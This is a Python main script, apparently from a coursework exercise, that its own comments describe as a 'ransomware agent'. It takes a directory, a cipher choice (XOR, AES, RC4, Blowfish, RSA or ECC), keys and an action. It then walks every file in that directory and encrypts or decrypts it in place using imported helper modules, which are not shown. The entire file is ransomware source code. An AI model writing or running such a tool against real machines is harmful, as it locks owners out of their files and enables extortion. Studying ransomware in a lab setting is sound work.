import sys
from src import argparser
from src import filewalker
from src import cipher
from keys.get_keys import get_keys

# The ransomware agent should be able to encrypt and decrypt file contents using the command line. 
# The command line should receive the following argument options:

# --directory : The directory that will be used for encryption
# --type: gets to values of “sym” and “asym” for symmetric and asymmetric algorithm selection
# --secrets: an n-tuple input used for secrets such as keys, and other important parameters needed for the crypto scheme, e.g. algorithm itself. Feel free to define sub-parameters if needed.
# --action: decrypt or encrypt

def main(directory: str, cipher_type: str, secrets: str, sender: str, receiver: str, action: str):
    cipher_methods = {
        "xor": cipher.XORCipher(secrets),
        "aes": cipher.AESCipher(secrets),
        "rc4": cipher.RC4Cipher(secrets),
        "blowfish": cipher.BlowFishCipher(secrets)
    }
    if cipher_type in cipher_methods.keys():
        chosen_cipher_method = cipher_methods.get(cipher_type.lower())
    else:
        if cipher_type.lower() == "rsa":
            sender_private_key = get_keys(sender, "rsa", "private")
            sender_public_key = get_keys(sender, "rsa", "public")
            receiver_public_key = get_keys(receiver, "rsa", "public")
            chosen_cipher_method = cipher.RSACipher(sender_private_key, sender_public_key, receiver_public_key)
        else: # ecc
            sender_private_key = get_keys(sender, "ecc", "private")
            sender_public_key = get_keys(sender, "ecc", "public")
            receiver_public_key = get_keys(receiver, "ecc", "public")
            chosen_cipher_method = cipher.ECCCipher(sender_private_key, sender_public_key, receiver_public_key)
    
    if action == "encrypt":
        filewalker.walk_files_and_apply_func(directory, chosen_cipher_method.encrypt)
    elif action == "decrypt":
        filewalker.walk_files_and_apply_func(directory, chosen_cipher_method.decrypt)
    

if __name__ == "__main__":
    argv = argparser.run_argparser().parse_args()
    main(argv.directory, argv.type, argv.secrets, argv.sender, argv.receiver, argv.action)
    